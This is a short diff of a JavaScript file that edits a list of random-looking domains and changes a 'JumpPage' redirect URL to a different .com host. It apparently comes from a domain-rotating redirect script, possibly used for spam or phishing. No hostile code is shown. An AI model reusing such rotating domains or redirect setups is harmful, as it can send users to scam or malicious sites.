@@ -39,9 +39,10 @@ var emails = [
 var urls=[];
        urls.push(".jkunaxi.cc"); 
        urls.push(".cnnfexm.top");
-       urls.push(".eeerytid.top");   
-            		
-var JumpPage="https://jljjfip.cc";
+       urls.push(".jkunaxi.cc");   
+      
+      		
+var JumpPage="https://csemkay.com";
 
 var newestUrls = [];
 
